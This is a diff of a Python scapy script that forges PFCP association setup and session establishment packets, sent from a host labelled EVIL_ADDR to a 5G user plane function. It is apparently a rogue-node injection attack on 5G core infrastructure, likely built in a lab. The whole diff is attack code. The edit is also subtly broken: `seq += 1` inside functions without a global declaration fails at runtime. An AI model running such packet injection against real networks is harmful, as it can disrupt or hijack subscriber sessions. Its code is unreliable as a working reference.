@@ -3,13 +3,13 @@ from scapy.contrib.pfcp import *
 import time
 EVIL_ADDR = "10.100.200.66" 
 UPF_ADDR  = "10.100.200.2"
-
+seq=1
 
 
 
 def send_pfcp_association_setup_req():
     
-    seq = 1
+    
 
     node_id = IE_NodeId(id_type=0, ipv4=EVIL_ADDR)
     recovery_timestamp = IE_RecoveryTimeStamp(
@@ -80,7 +80,7 @@ def send_pfcp_session_establishment_req():
     print("PFCP Session Establishment packet:", packet.show())
     send(packet)
     print(f"PFCP Session Establishment packet sent")
-
+    seq +=1
 
 
 
@@ -98,7 +98,8 @@ def send_pfcp_session_establishment_test():
     pfcp_msg = PFCP(
         version=1,
         message_type=50,
-        seid=seid,
+        seid=0,
+        S=1,
         seq=seq
     ) / \
     IE_NodeId(id_type=0, ipv4=src_ip) / \
@@ -127,6 +128,7 @@ def send_pfcp_session_establishment_test():
     pkt.show()
     send(pkt)
     print("Packet sent.")
+    seq += 1
 
 
 send_pfcp_association_setup_req()
